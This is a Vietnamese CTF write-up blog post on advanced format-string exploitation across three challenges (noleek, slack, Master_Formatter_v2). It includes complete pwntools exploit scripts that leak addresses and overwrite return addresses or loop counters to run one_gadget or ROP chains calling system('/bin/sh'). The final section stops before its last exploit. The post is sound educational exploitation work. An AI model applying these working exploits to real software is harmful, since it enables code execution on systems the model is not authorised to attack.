---
title: format-string advance
date: 2025-02-14 00:00:00 +0800
categories: [pwn]
tags: [fsb]
author: "kuvee"
layout: post
---


## noleek  (angstromCTF)


### reversing

- 1 bài khá ngắn , đầu tiên nó sẽ mở file ```/dev/null``` , ta sẽ được input 2 lần với mỗi lần là 31 bytes , và tương ứng ta cũng có 2 bug ```fsb``` ở 2 lần input này 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  FILE *stream; // [rsp+28h] [rbp-8h]

  setbuf(_bss_start, 0LL);
  stream = fopen("/dev/null", "w");
  if ( stream )
  {
    printf("leek? ");
    fgets(s, 32, stdin);
    fprintf(stream, s);                         // fsb
    printf("more leek? ");
    fgets(s, 32, stdin);
    fprintf(stream, s);
    puts("noleek.");
    cleanup(0LL, 0LL, 0LL);
    return 0;
  }
  else
  {
    puts("wtf");
    return 1;
  }
}
```

checksec: PIE bậtật

```cs
pwndbg> checksec
File:     /home/ploi/pwn/FSB/noleek/noleek_patched
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
Stripped:   No
```

### EXPLOIT

- tuy nhiên ở bài này nó sử dụng ```fprintf``` thay vì ```printf``` , sau khi tìm hiểu thì mình hiểu nó sẽ in output của ta dựa trên ```fd``` và bài này nó chính là ```/dev/null``` , vậy ta sẽ không thể leak bất cứ thứ gì?

- đây là stack ở ```fprintf``` thứ nhất , ý tưởng của mình là tìm ra 1 con trỏ nào đó trỏ đến 1 địa chỉ khác , vậy ta có thể ghi nó thành địa chỉ ```saved_rip``` , tuy nhiên vì chỉ được input 31 bytes và ở stack cũng không có bất kì con trỏ nào hữu ích để thực hiện việc nàynày

```cs
pwndbg> tel
00:0000│ rdx rsi r8 rsp 0x7ffd874aa700 ◂— 0xa61 /* 'a\n' */
01:0008│-028            0x7ffd874aa708 ◂— 0
02:0010│-020            0x7ffd874aa710 —▸ 0x55b924c44290 (__libc_csu_init) ◂— push r15
03:0018│-018            0x7ffd874aa718 —▸ 0x55b924c440a0 (_start) ◂— xor ebp, ebp
04:0020│-010            0x7ffd874aa720 —▸ 0x7ffd874aa820 ◂— 1
05:0028│-008            0x7ffd874aa728 —▸ 0x55b9255842a0 ◂— 0xfbad2484
06:0030│ rbp            0x7ffd874aa730 —▸ 0x55b924c44290 (__libc_csu_init) ◂— push r15
07:0038│+008            0x7ffd874aa738 —▸ 0x7f38a7eabd0a (__libc_start_main+234) ◂— mov edi, eax
```

- lúc này thì nhớ ra ta còn 1 cách khác đó là sử dụng ```*``` , vậy ta có thể làm gì với nó?  ta sẽ dùng ```%*$c``` để in 4 byte và ghi vào 1 con trỏ khác 

- ý định rất rõ ràng ta , để dễ hiểu ta có thể tưởng tượng như sau: 

ta sẽ cần tìm 1 địa chỉ nào đó có số byte gần với A để thay đổi D thành A 

```cs
A-> libc_start_main  

B->C->D
C->D
```

- và nếu thay đổi thành công thì ta được thế này 

vậy lúc này ta hoàn toàn có thể dùng cách này và ghi vào libc_start_main đúng chứ???

```cs
A->libc_start_main

B->C->A->libc_start_main
C->A->libc_start_main
```

- sau 1 lúc tìm kiếm trên stack thì mình vẫn chưa thấy , tuy nhiên khi nhìn vào ```rsi```  nó là ```0x7ffd37473a30``` so với ```0x7ffd37473a68``` saved_rip , vậy ta hoàn toàn có thể padding thêm cho nó bằng nhau đúng chứ?

![here](/assets/images/fsb1.png)

- ta cũng cần tìm 1 con trỏ như sơ đồ ở trên =))) ta sẽ thử với ```0x7ffd37473af0```

![here](/assets/images/fsb2.png)

- như ta đã thấy ta đã thành công trong việc thay đổi nó :

bây giờ ta chỉ cần tìm offset của ```0x7ffe2c925c58``` và kết hợp tương tự với 1 địa chỉ libc ở đâu đó trên stack hoặc ```reg``` và padding thêm với ```one_gadget```

![done](/assets/images/done.png)


- one_gadget : 

```cs
ploi@PhuocLoiiiii:~/pwn/FSB/noleek$ one_gadget ./libc.so.6
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL || r12 is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL || r12 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

- đây là mã asm của hàm ```clean_up``` , ta thấy nó sẽ setup 3 thằng đó về NULL vậy ta sẽ chọn one_gadget ```0xc9620```

```cs
.text:0000000000001185                 push    rbp
.text:0000000000001186                 mov     rbp, rsp
.text:0000000000001189                 mov     [rbp+var_4], edi
.text:000000000000118C                 mov     [rbp+var_8], esi
.text:000000000000118F                 mov     [rbp+var_C], edx
.text:0000000000001192                 nop
.text:0000000000001193                 pop     rbp
.text:0000000000001194                 retn
```

- ta sẽ thử ghi địa chỉ này vào 

![here](/assets/images/fsb3.png)

- trước khi overwrite

```cs
18:00c0│+090 0x7ffd277e2230 —▸ 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa646418d0a (__libc_start_main+234) ◂— mov edi, eax
19:00c8│+098 0x7ffd277e2238 —▸ 0x7ffd277e22a8 —▸ 0x7ffd277e2c66 ◂— 'SHELL=/usr/bin/bash'
1a:00d0│+0a0 0x7ffd277e2240 —▸ 0x7fa6465f8180 —▸ 0x55e00ede5000 ◂— 0x10102464c457f
1b:00d8│+0a8 0x7ffd277e2248 ◂— 0
1c:00e0│+0b0 0x7ffd277e2250 ◂— 0
1d:00e8│+0b8 0x7ffd277e2258 —▸ 0x55e00ede60a0 (_start) ◂— xor ebp, ebp
1e:00f0│+0c0 0x7ffd277e2260 —▸ 0x7ffd277e2290 ◂— 1
1f:00f8│+0c8 0x7ffd277e2268 ◂— 0
pwndbg>
20:0100│+0d0 0x7ffd277e2270 ◂— 0
21:0108│+0d8 0x7ffd277e2278 —▸ 0x55e00ede60ca (_start+42) ◂— hlt
22:0110│+0e0 0x7ffd277e2280 —▸ 0x7ffd277e2288 ◂— 0x1c
23:0118│+0e8 0x7ffd277e2288 ◂— 0x1c
24:0120│+0f0 0x7ffd277e2290 ◂— 1
25:0128│+0f8 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa646418d0a (__libc_start_main+234) ◂— mov edi, eax
```

- sau khi overwrite

```cs
18:00c0│+090 0x7ffd277e2230 —▸ 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa6464188e9 ◂— mov r8, rax
19:00c8│+098 0x7ffd277e2238 —▸ 0x7ffd277e22a8 —▸ 0x7ffd277e2c66 ◂— 'SHELL=/usr/bin/bash'
1a:00d0│+0a0 0x7ffd277e2240 —▸ 0x7fa6465f8180 —▸ 0x55e00ede5000 ◂— 0x10102464c457f
1b:00d8│+0a8 0x7ffd277e2248 ◂— 0
1c:00e0│+0b0 0x7ffd277e2250 ◂— 0
1d:00e8│+0b8 0x7ffd277e2258 —▸ 0x55e00ede60a0 (_start) ◂— xor ebp, ebp
1e:00f0│+0c0 0x7ffd277e2260 —▸ 0x7ffd277e2290 ◂— 1
1f:00f8│+0c8 0x7ffd277e2268 ◂— 0
pwndbg>
20:0100│+0d0 0x7ffd277e2270 ◂— 0
21:0108│+0d8 0x7ffd277e2278 —▸ 0x55e00ede60ca (_start+42) ◂— hlt
22:0110│+0e0 0x7ffd277e2280 —▸ 0x7ffd277e2288 ◂— 0x1c
23:0118│+0e8 0x7ffd277e2288 ◂— 0x1c
24:0120│+0f0 0x7ffd277e2290 ◂— 1
25:0128│+0f8 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa6464188e9 ◂— mov r8, rax
```

- vậy đơn giản ta sẽ làm 1 phép tính đơn giản (og + libc_base) - địa chỉ vừa ghi  , ta sẽ padding thêm số byte với địa chỉ vừa ghi là sẽ thành công


exp : 


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./noleek_patched")
libc = ELF("./libc-2.31.so")

context.binary = exe

#p = process()
p = remote('localhost',5000)

payload = f'%*c%{0x38}c%29$n'.encode()
input()
p.sendlineafter(b'leek? ',payload)

offset = 42

payload2 = f'%*16$c%{0xa5d37}c%42$n'.encode()
log.info(f'one_gadget: {hex(0xc9620)}')
input()
p.sendlineafter(b'more leek? ',payload2)
p.interactive()
```

- enjoy flag ^^

![here](/assets/images/flagfsb.png)

- ở đây ta cần chú ý 1 vài điều , ```libc_start_main_ret``` cũng có thể in ra tuy nhiên vì ta cùng lúc ghi và lúc đọc nên có thể xảy ra lỗi , ta có thể sử dụng %n hoặc lớn hơn vì nó ghi vào ```/dev/null```
- cuối cùng là 1 lưu ý khi sử dụng "*" , nó sẽ trỏ đến có kiểu là ```int``` , vì vậy nếu đó là số âm thì nó sẽ bị sai , nếu sai thì ta cần thử lại chày cối nhiều lần là được

ref [here](https://github.com/johnathanhuutri/CTFWriteup/tree/master/2023/angstromCTF/noleek)


## slack


### overview

checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/FSB/slack$ checksec slack
[*] '/home/ploi/pwn/FSB/slack/slack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
- ta sẽ bỏ qua những hàm không quan trọng ở bài này và vào vấn đề chính , ta sẽ có 1 loop với 3 lần input và 3 lần ```fsb```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v4; // eax
  int i; // [rsp+8h] [rbp-68h]
  __gid_t rgid; // [rsp+Ch] [rbp-64h]
  time_t timer; // [rsp+10h] [rbp-60h] BYREF
  struct tm *tp; // [rsp+18h] [rbp-58h]
  char s[32]; // [rsp+20h] [rbp-50h] BYREF
  char format[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v13; // [rsp+68h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Welcome to slack (not to be confused with the popular chat service Slack)!");
  timer = time(0LL);
  tp = localtime(&timer);
  v3 = time(0LL);
  srand(v3);
  for ( i = 0; i <= 2; ++i )
  {
    strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);
    v4 = rand();
    printf("%s -- slack Bot:  %s\n", s, (&messages)[v4 % 8]);
    printf("Your message (to increase character limit, pay $99 to upgrade to Professional): ");
    fgets(format, 14, stdin);
    tp = localtime(&timer);
    strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);
    printf("%s -- You: ", s);
    printf(format);
    putchar(10);
  }
  return v13 - __readfsqword(0x28u);
}
```

### EXPLOIT

- ở bài này ```FULL_RELRO``` nên sẽ không thể overwrite ```got``` được , nên có lẽ là ta sẽ build rop_chain và overwrite ```saved_rip``` , trước hết thì có lẽ ta cần leak libc và stack_addressaddress , 1 điều cần để ý nữa là ta chỉ có 13 byte để build nên sẽ hơi khó khăn tuy nhiên thì ta sẽ leak trước rồi tính sau

```cs
pl_leak = b'|%21$p|%25$p|'
input()
p.sendlineafter(b'Professional): ',pl_leak)
p.recvuntil(b'|')
libc.address = int(p.recvuntil(b'|')[:-1],16) - 0x29d90
log.info(f'libc: {hex(libc.address)}')

stack_leak = int(p.recvuntil(b'|')[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
```

- lúc này vừa leak xong hết thì chỉ còn 2 lần được ```fsb``` T_T , mà cho dù có thêm 3 lần nữa cũng khó mà build rop_chain được =)) nên ý tưởng của ta là sẽ thay đổi giá trị đếm của loop thành 1 số âm (vì i là kiểu int nên khi nó âm -> 1 số lớn) và giá trị -1 sẽ là số lớn nhất trong ```int``` nó sẽ là 0x80xxxxxx
- vậy ta cần tìm 1 con trỏ nào đó để thay đổi nó trỏ đến biến ```i``` , lần ghi thứ 3 ta sẽ hoàn thành và lúc này loop vô hạn thì ta sẽ build thoải mái =))) 

- ```0x7fffffffd8a8``` địa chỉ này sẽ là địa chỉ thích hợp , vậy ta cần tính toán offset của nó và địa chỉ ta cần ghi 

![here](/assets/images/fsb5.png)

idx sẽ là 25

```cs
pwndbg> p/x (0x7fffffffd8a8-0x7fffffffd810)/8 +6
$5 = 0x19
pwndbg> p/d 0x19
$6 = 25
```

- ta cần tính toán địa chỉ leak được và địa chỉ của biến i , vì ta sẽ ghi byte cao nhất của nó nên ta sẽ +3 vào

```cs
00:0000│ rsp 0x7fffd189b1d0 ◂— 1
01:0008│-068 0x7fffd189b1d8 ◂— 0x3ea00000000
02:0010│-060 0x7fffd189b1e0 ◂— 0x67af3c21
03:0018│-058 0x7fffd189b1e8 —▸ 0x7f4fc06246a0 ◂— 0x3200000029 /* ')' */
04:0020│-050 0x7fffd189b1f0 ◂— '2025-02-14 12:50:41'
05:0028│-048 0x7fffd189b1f8 ◂— '14 12:50:41'
06:0030│-040 0x7fffd189b200 ◂— 0x7fff0031343a /* ':41' */
07:0038│-038 0x7fffd189b208 ◂— 0x10101000000
pwndbg>
08:0040│-030 0x7fffd189b210 ◂— '|%21$p|%25$p|'
09:0048│-028 0x7fffd189b218 ◂— 0x7c70243532 /* '25$p|' */
0a:0050│-020 0x7fffd189b220 —▸ 0x7fffd189b5c9 ◂— 0x34365f363878 /* 'x86_64' */
0b:0058│-018 0x7fffd189b228 ◂— 0x64 /* 'd' */
0c:0060│-010 0x7fffd189b230 ◂— 0x1000
0d:0068│-008 0x7fffd189b238 ◂— 0x558f68dadde8e500
0e:0070│ rbp 0x7fffd189b240 ◂— 1
0f:0078│+008 0x7fffd189b248 —▸ 0x7f4fc042cd90 ◂— mov edi, eax
pwndbg>
10:0080│+010 0x7fffd189b250 ◂— 0
11:0088│+018 0x7fffd189b258 —▸ 0x5615d5fc22c9 (main) ◂— endbr64
12:0090│+020 0x7fffd189b260 ◂— 0x1d189b340
13:0098│+028 0x7fffd189b268 —▸ 0x7fffd189b358 —▸ 0x7fffd189bc42 ◂— '/home/ploi/pwn/FSB/slack/slack_patched'
14:00a0│+030 0x7fffd189b270 ◂— 0
15:00a8│+038 0x7fffd189b278 ◂— 0x81ba5d8b3ca2843
16:00b0│+040 0x7fffd189b280 —▸ 0x7fffd189b358 —▸ 0x7fffd189bc42 ◂— '/home/ploi/pwn/FSB/slack/slack_patched'
17:00b8│+048 0x7fffd189b288 —▸ 0x5615d5fc22c9 (main) ◂— endbr64
pwndbg> p/x 0x7fffd189b358-0x7fffd189b1d8+3
$7 = 0x183
```

- việc tiếp theo ta sẽ đơn giản là change nó thành -1 (0x80) thôi , và build chuỗi rop_chain của mình

```cs
payload_change = f'%{change_var & 0xffff}c%25$hn'.encode()
payload_change = payload_change.ljust(13,b'a')

payload_change_var = f'%{0x80}c%55$hn'.encode()
p.sendlineafter(b'Professional): ',payload_change + payload_change_var)
pop_rdi = 0x000000000002a3e5 + libc.address
saved_rip = stack_leak - 0x110
log.info(f'saved_rip : {hex(saved_rip)}')
build_rop_chain = flat(
        pop_rdi+1,
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym.system,
        )
```

- lúc này ta build ```rop_chain``` thành công , việc cần làm tiếp theo là overwrite nó , tuy nhiên với đầu vào hạn chế ta phải thực hiện nó tương tự như change biến ```i``` , ta sẽ overwrite thành địa chỉ stack xong ghi từng byte vào 

```cs
for i in range(len(build_rop_chain)):
    payload = f'%{(saved_rip & 0xffff)+i}c%25$hn'.encode()
    payload = payload.ljust(13,b'a')

    if build_rop_chain[i] == 0:
        payload1 = b'%55$hhn'
    else:
        payload1 = f'%{build_rop_chain[i]}c%55$hhn'.encode()
    p.sendline(payload + payload1)
```

- ghi xong rồi thì change lại biến ```i``` và enjoy shell =)))

```cs
payload_change_var = f'%{0x2}c%55$hn'.encode()
input()
p.sendlineafter(b'Professional',payload_change + payload_change_var)
```

full exp : 


```cs
#!/usr/bin/env python3

from pwn import *

exe = ELF("./slack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = remote('localhost',5000)

pl_leak = b'|%21$p|%25$p'
p.sendlineafter(b'Professional): ',pl_leak)
p.recvuntil(b'|')
libc.address = int(p.recvuntil(b'|')[:-1],16) - 0x29d90
log.info(f'libc: {hex(libc.address)}')

stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
change_var = stack_leak - 0x17d


log.info(f'change: {hex(change_var)}')

payload_change = f'%{change_var & 0xffff}c%25$hn'.encode()
payload_change = payload_change.ljust(13,b'a')

payload_change_var = f'%{0x80}c%55$hn'.encode()
p.sendlineafter(b'Professional): ',payload_change + payload_change_var)
pop_rdi = 0x000000000002a3e5 + libc.address
saved_rip = stack_leak - 0x110
log.info(f'saved_rip : {hex(saved_rip)}')
build_rop_chain = flat(
        pop_rdi+1,
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym.system,
        )

for i in range(len(build_rop_chain)):
    payload = f'%{(saved_rip & 0xffff)+i}c%25$hn'.encode()
    payload = payload.ljust(13,b'a')

    if build_rop_chain[i] == 0:
        payload1 = b'%55$hhn'
    else:
        payload1 = f'%{build_rop_chain[i]}c%55$hhn'.encode()
    p.sendline(payload + payload1)


payload_change_var = f'%{0x2}c%55$hn'.encode()
input()
p.sendlineafter(b'Professional',payload_change + payload_change_var)



p.interactive()
```

![here](/assets/images/shellfsb.png)

- ngoài ra cũng có 1 bài rất hay về fsb , mình sẽ để ở [here](https://hackmd.io/@kuvee/SkaBUl2rJl)

## Master_Formatter_v2 

### overview

- ta sẽ có 3 option chính ở bài này 

```cs
// local variable allocation has failed, the output may be wrong!
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int OPTION; // [rsp+0h] [rbp-10h] BYREF
  int v5; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v5 = 0;
  while ( 1 )
  {
    menu(*(_QWORD *)&argc, argv, envp);
    argv = (const char **)&OPTION;
    *(_QWORD *)&argc = "%d%*c";
    __isoc99_scanf("%d%*c", &OPTION);
    if ( OPTION == 4 )
      return 0;
    if ( OPTION > 4 )
      goto LABEL_14;
    switch ( OPTION )
    {
      case 3:
        duplicate();
        break;
      case 1:
        hint();
        break;
      case 2:
        if ( v5 > 1 )
        {
          *(_QWORD *)&argc = "Ran out";
          puts("Ran out");
        }
        else
        {
          vuln();
          ++v5;
        }
        break;
      default:
LABEL_14:
        *(_QWORD *)&argc = "Invalid input";
        puts("Invalid input");
        break;
    }
  }
}
```

- option1 : ta sẽ có 1 libc leak 

```c
int hint()
{
  return printf("Have this: %p\n", &fgets);
}
```

- option2  : không có ```bof``` ở đây , ta sẽ nói về điều này sau 

```c
unsigned __int64 duplicate()
{
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(s, 0, 0x1EuLL);
  printf("Input\n>> ");
  fgets(s, 29, stdin);
  strdup(s);
  return v2 - __readfsqword(0x28u);
}
```

- option3 : ta được input 29 bytes và có ngay 1 ```fsb``` , tuy nhiên ta có 1 hàm ```filter``` ở phía trước  

```c
unsigned __int64 vuln()
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(s, 0, 0x1EuLL);
  printf("Input\n>> ");
  fgets(s, 29, stdin);
  filter(s);
  printf(s);
  return v2 - __readfsqword(0x28u);
}
```

- filter : nó sẽ check xem trong input ```fsb``` của ta có các kí tự này không? nếu có thì exit , bình thường ta thường sẽ sử dụng ```%p , %x``` để leak đúng không? tuy nhiên nó đã bị filer rồi 

```c
char *__fastcall filter(const char *a1)
{
  char *result; // rax

  if ( strchr(a1, 'p')
    || strchr(a1, 'u')
    || strchr(a1, 'd')
    || strchr(a1, 'x')
    || strchr(a1, 'f')
    || strchr(a1, 'i')
    || strchr(a1, 'e')
    || strchr(a1, 'g')
    || strchr(a1, 'a')
    || strchr(a1, 'U')
    || strchr(a1, 'U')
    || strchr(a1, 'D')
    || strchr(a1, 'X')
    || strchr(a1, 'F')
    || strchr(a1, 'I')
    || strchr(a1, 'E')
    || strchr(a1, 'G')
    || (result = strchr(a1, 'A')) != 0LL )
  {
    puts("Cant leak anything");
    exit(1);
  }
  return result;
}
```

- vấn đề này có khá nhiều cách giải quyết , ta có thể dùng %x$s với x là offset , nếu may mắn thì ta hoàn toàn có thể leak được   , hoặc 1 cách khác là dùng %o đây là 1 định dạng octal , tuy nhiên nó chỉ leak tối đa 4 bytes ? địa chỉ stack sẽ là 0x7ffx  vậy tỉ lệ thành công là 1/16

- payload: 

```cs
p.sendlineafter(b'>> ',b'2')
input()
p.sendlineafter(b'>> ',b'%12$o')

leak = int(p.recvline()[:-1],8)
print(hex(leak))
```

```cs
[*] leak: 0x7f5c56f24000

0xeb78c160
```

so với 

```cs
00:0000│ rsp 0x7ffceb78c110 ◂— 0xa6f24323125 /* '%12$o\n' */
01:0008│-028 0x7ffceb78c118 ◂— 0
... ↓        2 skipped
04:0020│-010 0x7ffceb78c130 —▸ 0x557c8283ad78 (__do_global_dtors_aux_fini_array_entry) —▸ 0x557c82838210 (__do_global_dtors_aux) ◂— endbr64
05:0028│-008 0x7ffceb78c138 ◂— 0x1854714781e65a00
06:0030│ rbp 0x7ffceb78c140 —▸ 0x7ffceb78c160 ◂— 1
07:0038│+008 0x7ffceb78c148 —▸ 0x557c828386c5 (main+134) ◂— add dword ptr [rbp - 0xc], 1
```

- vậy ta sẽ dùng %offset$s sẽ safe hơn không phải random , ý tưởng là ta có libc -> ta sẽ có environ libc và con trỏ này chứa địa chỉ stack , tuy nhiên nó có 1 số byte bị filter nên ta cần mở gdb tìm các environ khác như sau: 

- lấy 4 bytes của stack và search , xong trừ nó đi 2 ta sẽ được 1 địa chỉ libc chứa địa chỉ stack

![find](/assets/images/findaddress.png)


với payload này , địa chỉ libc là mình tìm được ở công đoạn trên , vì random đôi lúc dính 1 byte filter nên cần chạy nhiều lần


```python
payload = b'%7$szzzz'
payload += p64(libc.address +0x1ff550)
```

- ta thấy lúc này ở offset 7 chứa địa chỉ stack , vì vậy ta có thể leak thành công ^^

![stack](/assets/images/stack-address.png)

![here](/assets/images/stack-leak3.png)

- điều tiếp theo cần làm là ta chỉ có 2 lần được ```fsb``` , ta phải ghi giá trị biến đếm thành 1 giá trị âm (0x80xxxxx) , và ta cũng sẽ tính toán ```saved_rip``` của ```main```


```cs
leak_stack = u64(p.recv(6).ljust(8,b'\x00'))

count = leak_stack - 0x118 - 0xc + 3
saved_rbp_main = leak_stack - 0x118
log.info(f'leak_stack: {hex(leak_stack)}')
log.info(f'count: {hex(count)}')
log.info(f'saved_rbp_main: {hex(saved_rbp_main)}')

payload_change_count = b'%128c%8$hhn'
payload_change_count = payload_change_count.ljust(16,b'z')
payload_change_count += p64(count)

p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'>> ',payload_change_count)
```



- ta thấy giờ ta có thể thoải mái build rop_chain trên stack 

![here](/assets/images/loop_good.png)

- cuối cùng ta sẽ overwrite ```saved_rip``` của main nữa là được 

- tìm các gadget: 

```cs
ploi@PhuocLoiiiii:~/pwn/FSB/Master_Formatter_v2$ ROPgadget --binary libc.so.6 | grep -e ".*: pop rdi ; ret$"
0x0000000000028715 : pop rdi ; ret
ploi@PhuocLoiiiii:~/pwn/FSB/Master_Formatter_v2$ ROPgadget --binary libc.so.6 | grep -e ".*: ret$"
0x0000000000026a3e : ret
```

- lúc đầu mình thử build payload bằng pwntools , tuy nhiên nó vướng badbyte nên hình như không thành công

```cs
badbytes = frozenset({0x70, 0x75,0x64,0x78,0x66,0x69,0x65,0x67,0x61,0x55,0x44,0x58,0x46,0x49,0x45,0x47})

def build_fsb(offset,where,what,size,badbytes):
    payload = fmtstr_payload(offset,{where:what},write_size=size,badbytes=badbytes)
    p.sendlineafter(b'>> ',b'2')
    p.sendlineafter(b'>> ',payload)

input()
build_fsb(6,saved_rip,bytes.fromhex(hex(POP_RDI)[2:])[:-1],"byte",badbytes)
build_fsb(6,saved_rip+1,bytes.fromhex(hex(POP_RDI)[2:])[:-2],"byte",badbytes)
build_fsb(6,saved_rip+2,bytes.fromhex(hex(POP_RDI)[2:])[:-3],"byte",badbytes)
build_fsb(6,saved_rip+3,bytes.fromhex(hex(POP_RDI)[2:])[:-4],"byte",badbytes)
build_fsb(6,saved_rip+4,bytes.fromhex(hex(POP_RDI)[2:])[:-5],"byte",badbytes)
build_fsb(6,saved_rip+5,bytes.fromhex(hex(POP_RDI)[2:])[:-6],"byte",badbytes)
```

- vậy thì ta viết 1 payload ghi từng byte như sau: 

```python
def write_byte(addr,b):
    log.info(f"target : 0x{addr:x}")
    if b == 0:
        b = 256
    fmt = f"%{b}c%8$hhn".encode().ljust(16,b"\x01") + p64(addr)
    assert len(fmt) == 24
    return fmt
```

epx: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

p.sendlineafter(b'>> ',b'1')
p.recvuntil(b'Have this: ')
libc.address = int(p.recvline()[:-1],16) - libc.sym.fgets
log.info(f'leak: {hex(libc.address)}')

p.sendlineafter(b'>> ',b'2')
libc_environ = libc.sym.environ
payload = b'%7$szzzz'
payload += p64(libc.address + 0x1ff8c2 - 2)
p.sendlineafter(b'>> ',payload)
leak_stack = u64(p.recv(6).ljust(8,b'\x00'))

count = leak_stack - 0x118 - 0xc + 3
saved_rbp_main = leak_stack - 0x118
saved_rip = saved_rbp_main + 8
log.info(f'leak_stack: {hex(leak_stack)}')
log.info(f'count: {hex(count)}')
log.info(f'saved_rbp_main: {hex(saved_rbp_main)}')

payload_change_count = b'%128c%8$hhn'
payload_change_count = payload_change_count.ljust(16,b'z')
payload_change_count += p64(count)

p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'>> ',payload_change_count)

POP_RDI = 0x0000000000028715+libc.address
ret = POP_RDI+1
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system

log.info(f'system: {hex(system)}')
log.info(f'pop_rdi: {hex(POP_RDI)}')
log.info(f'bin_sh: {hex(bin_sh)}')

pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
rop = b"".join([p64(i) for i in rop])

def write_byte(addr,b):
    log.info(f"target : 0x{addr:x}")
    if b == 0:
        b = 256
    fmt = f"%{b}c%8$hhn".encode().ljust(16,b"\x01") + p64(addr)
    assert len(fmt) == 24
    return fmt
pl = p64(POP_RDI) + p64(bin_sh) + p64(ret) +p64(system)

input()

for i, c in enumerate(pl):
    p.sendlineafter(b'>> ',b'2')
    payload1 = write_byte(saved_rip+i,c)
    p.sendlineafter(b'>> ',payload1)

p.sendlineafter(b'>> ',b'4')



p.interactive()
```

![build](/assets/images/build_rip.png)

- lí do mình làm lại bài này là nó đề cập đến overwrite ```got``` của libc , vậy ta sẽ cùng làm theo cách đó thử 

- truớc hết là ta cần hiểu quy trình của nó , ở option2 ta thấy nó gọi ```strdup``` và đúng là kh phải tự nhiên nó gọi hàm này 


https://elixir.bootlin.com/glibc/latest/source/string/strdup.c

ta có thể thấy strdup nó sẽ gọi ```strlen``` , ```malloc``` , ```memcpy``` 

- ở đây nó sẽ gọi ```strlen``` và bên dưới ta cũng thấy nó sẽ call ```malloc```

![here](/assets/images/libc_got.png)

- lúc này nó sẽ jmp đến got@libc , và địa chỉ đó hoàn toàn có thể ghi?

![here](/assets/images/libc_got_23.png)

- vậy ý tưởng là ta có thể ghi 1 one_gadget vào đúng không :))) 

one_gadget : 

```cs
ploi@PhuocLoiiiii:~/pwn/FSB/Master_Formatter_v2$ one_gadget ./libc.so.6
0x54ecc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x16b52a, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x54ed3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x16b52a, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xeb58e execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xeb5eb execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

- và check lại thì không có thằng nào thõa :v

check thêm thằng này : https://github.com/ChrisTheCoolHut/angry_gadget cũng không có

- ta cũng có thể check tại ```malloc``` : 

![here](/assets/images/got_libc_1.png)

- check memcpy 

ở đây nó cũng không hề thõa bất kì điều kiện nào , nhưng hãy để ý 1 điều là trên stack có chuỗi ta nhập vào? vậy điều này có thể làm được gì 

![here](/assets/images/memcpyu.png)

- ta sẽ tìm kiếm 1 gadget có thể pop 3 thằng đó ra và tiếp theo nó sẽ return về payload mà ta nhập vào

exp: 


```python
from pwn import *

